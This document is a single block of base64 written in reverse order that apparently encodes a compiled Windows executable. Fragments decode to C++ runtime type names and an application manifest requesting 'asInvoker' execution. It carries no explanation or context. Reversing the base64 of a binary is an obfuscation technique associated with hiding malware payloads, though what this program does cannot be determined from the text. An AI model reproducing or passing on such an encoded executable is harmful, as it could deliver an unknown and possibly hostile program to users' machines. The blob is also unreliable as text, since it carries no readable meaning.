AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACIgACIgACIgACIgACIgACIgACIgACIgACIAAAAAAAAQABEQABEQABEQABEQABEQABEQABEQABEQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAx//////////DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgCA+////PAAAgCAAAA4BAAAcAAAAwAAAk4kAAAA8PAAJONAAAA8DAQijDAAAgeAAk4IBAAAkHAAJOWAAAA4BAQijGAAAgIAA04IAAAAECAAROAAAAAgAAQkjDAAAwHAAE5cCAAA4BAAROvAAAAcAAQkTOAAAwGAAU5cAAAAoBAAVOVAAAAZAAQlzHAAAAGAAU50CAAAMBAAVO4AAAASAAQmTAAAAQEAAk50AAAAABAAZOYAAAAKAAQmjPAAAQCAA05kAAAAgAAAdOUAAAACAAAAAAAAV1IAAAAAAAAAAwADMwADMwADIgACIgACIgACIgACIgACIQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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